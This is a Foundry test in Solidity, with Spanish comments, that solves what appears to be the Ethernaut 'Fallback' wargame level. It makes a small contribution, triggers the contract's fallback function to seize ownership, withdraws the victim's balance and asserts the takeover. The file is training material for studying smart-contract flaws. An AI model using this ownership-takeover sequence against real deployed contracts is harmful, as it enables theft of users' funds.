pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/1_Fallback/Fallback.sol";

contract FallbackTest is Test {

    Fallback public victim;
    address public owner;
    address public addr1;

    function setUp() public{
        owner = vm.addr(1);
        addr1 = vm.addr(2);

        vm.deal(addr1, 1 ether);

        vm.prank(owner);
        victim = new Fallback();
    }

    function testAttack() public {

        //ingreasr valor al diccionario
        vm.startPrank(addr1);

        victim.contribute{value: 1 wei}();

        //tomar el owner, usando la funcion fallback
        payable(address(victim)).call{value : 1 wei}("");

        emit log_named_uint("Balance Antes de la victima", address(victim).balance);
        emit log_named_uint("Balance Antes del atacante", address(addr1).balance);
        victim.withdraw();

         emit log_named_uint("Balance Despues de la victima", address(victim).balance);
        emit log_named_uint("Balance Despues del atacante", address(addr1).balance);

        vm.stopPrank();

        assertEq(victim.owner(), addr1);
    }
}